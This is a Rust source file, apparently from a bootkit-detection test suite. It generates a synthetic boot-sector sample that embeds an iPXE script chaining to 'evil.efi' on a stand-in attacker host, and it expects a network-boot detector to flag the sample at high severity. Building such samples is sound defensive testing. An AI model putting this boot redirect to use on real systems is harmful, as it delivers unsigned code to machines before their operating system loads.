use anyhow::Result;

use crate::{Arch, ExpectedFinding, Payload, PayloadConfig};
use barzakh_core::Severity;

/// Emits an embedded iPXE boot script that redirects the network boot to an
/// attacker-controlled HTTP server (`chain http://…/evil.efi`). Models a
/// PXE/iPXE man-in-the-middle that delivers an unsigned bootloader before the OS.
pub struct NetworkBootRedirectPayload;

impl Payload for NetworkBootRedirectPayload {
    fn name(&self) -> &str {
        "network_boot_redirect"
    }

    fn arch(&self) -> Arch {
        Arch::X86_64
    }

    fn generate(&self, config: &PayloadConfig) -> Result<Vec<u8>> {
        let size = config.size.max(0x800);
        let mut data = vec![0u8; size];

        // MBR boot signature: this implant models a boot-sector-resident
        // bootkit (it redirects boot flow), so the sector is bootable.
        data[510] = 0x55;
        data[511] = 0xAA;

        let script = b"#!ipxe\n\
                       dhcp\n\
                       set keep-san 1\n\
                       chain http://198.51.100.13/evil.efi || shell\n";

        let at = 0x40;
        let end = (at + script.len()).min(size);
        data[at..end].copy_from_slice(&script[..end - at]);

        Ok(data)
    }

    fn expected_detections(&self) -> Vec<ExpectedFinding> {
        vec![ExpectedFinding {
            detector: "network_boot".to_string(),
            min_severity: Severity::High,
        }]
    }
}
